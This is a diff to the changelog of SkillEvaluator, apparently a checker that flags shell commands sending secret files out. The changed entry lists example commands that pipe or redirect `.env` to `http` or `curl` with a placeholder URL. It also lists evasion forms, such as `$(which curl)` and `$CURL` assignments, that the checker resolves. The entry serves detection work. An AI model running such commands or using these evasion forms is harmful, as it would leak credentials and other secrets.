@@ -435,13 +435,16 @@ All notable changes to SkillEvaluator are documented in this file.
   `git submodule foreach ssh host curl URL`, and a runner outside the set are
   checked only with the client's upload rules.
   Piped or redirected input stays with a text consumer such as `grep`, `awk`,
-  `sed`, or `jq`; any other command, loop, `if`, or `{ ...; }` group may pass
-  it on, so `cat .env | strace -f http URL`, `< .env http URL`, and
-  `while read -r l; do http URL; done < .env` still warn. A substitution whose
-  first command names a client or runner, such as `$(which curl)`,
-  `$(env which curl)`, `$(command -v curl 2>/dev/null)`,
-  `$(readlink -f $(which curl))`, or `$(which ssh)`, and `$CURL` after a
-  plain, `export`, or `declare` assignment, resolve to that command. A command
+  `sed`, or `jq`; any other command, loop, `if`, `{ ...; }` group, or function
+  body may pass it on, so `cat .env | strace -f http URL`, `< .env http URL`,
+  `sudo < .env http URL`, `2>&1 < .env http URL`, and
+  `while read -r l; do http URL; done < .env` still warn. A substitution any of
+  whose commands names a client or runner, such as `$(which curl)`,
+  `$(env which curl)`, `$(cd /tmp && which curl)`,
+  `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, or
+  `$(which ssh)`, and `$CURL` after a plain, `export`, `declare`, `read`, or
+  `printf -v` assignment, resolve to that command; a fallback chain such as
+  `$(command -v wget || command -v curl)` is checked once for each name. A command
   printed by `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its printed
   arguments. Both the host checker and the bundled Harbor verifier apply these
   rules.
